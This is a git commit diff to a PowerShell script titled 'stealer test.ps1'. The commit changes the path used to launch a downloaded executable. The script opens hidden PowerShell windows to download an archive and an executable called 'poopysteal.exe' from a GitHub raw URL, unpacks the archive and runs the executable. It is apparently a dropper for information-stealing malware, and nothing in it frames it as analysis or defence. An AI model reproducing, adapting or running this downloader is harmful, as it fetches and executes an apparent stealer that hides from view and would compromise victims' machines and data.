201b29c77163265bfbd796e2e031d6f53a7c1a72
TripsGitHub <98177677+TripsGitHub@users.noreply.github.com>
2025-07-15 03:00:14 -0700

    Update stealer test.ps1

--- stealer test.ps1
+++ stealer test.ps1
@@ -1,4 +1,4 @@
 powershell -WindowStyle Hidden Invoke-RestMethod 'https://raw.githubusercontent.com/TripsGitHub/poop/refs/heads/main/_internal.zip' -OutFile .\poop.zip
 powershell -WindowStyle Hidden Expand-Archive -Path poop.zip -DestinationPath .
 powershell -WindowStyle Hidden Invoke-RestMethod 'https://raw.githubusercontent.com/TripsGitHub/poop/refs/heads/main/poopysteal.exe' -OutFile .\poop.exe
-powershell Invoke-Item .\Downloads\poop.exe
+powershell Invoke-Item .\poop.exe
